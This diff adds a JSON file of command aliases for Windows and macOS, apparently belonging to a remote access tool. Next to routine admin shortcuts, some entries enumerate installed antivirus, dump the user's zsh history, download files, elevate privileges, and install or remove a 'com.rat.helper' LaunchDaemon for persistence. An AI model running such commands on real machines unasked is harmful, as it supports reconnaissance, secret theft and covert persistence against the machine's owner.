@@ -1,0 +1,29 @@
+{
+  "common": {
+    "pysleep": "pyexec_stream import time; time.sleep(<sec>)",
+    "openurl": "pyexec import webbrowser;webbrowser.open('<url>')"
+  },
+  "win": {
+    "enum_av": "powershell.exe Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct ^| Select-Object displayName",
+    "startup": "powershell.exe Get-CimInstance Win32_StartupCommand ^| Select-Object Name, Command, Location",
+    "pkill": "wmic process where name='<process_name>' call terminate",
+    "port": "powershell.exe Get-NetTCPConnection -State Listen ^| Sort-Object LocalPort ^| Select-Object LocalAddress, LocalPort, OwningProcess",
+    "wget": "powershell.exe Invoke-WebRequest -Uri <url> -OutFile <file>",
+    "sudo": "powershell.exe Start-Process -Verb runas <command>",
+    "ip": "powershell Get-NetIPAddress -AddressFamily IPv4 ^| Select-Object InterfaceAlias, IPAddress",
+    "show_desktop": "powershell.exe (New-Object -ComObject shell.application).toggleDesktop()",
+    "touch": "type nul > <filename>",
+    "lockscreen": "rundll32.exe user32.dll,LockWorkStation",
+    "md5": "certUtil -hashfile <file> MD5"
+  },
+  "mac": {
+    "sleep": "read ping -c <sec> 127.0.0.1",
+    "killport": "kill -9 $(lsof -t -i:<port>)",
+    "ipmac": "ipconfig getifaddr en0",
+    "zsh_history": "cat ~/.zsh_history",
+    "displayoff": "pmset displaysleepnow",
+    "clean_ds": "find . -name \"._*\" -type f -delete && find . -name \".DS_Store\" -type f -delete",
+    "persiston": "sudo launchctl bootstrap system /Library/LaunchDaemons/com.rat.helper.plist",
+    "persistoff": "sudo launchctl bootout system /Library/LaunchDaemons/com.rat.helper.plist",
+  }
+}
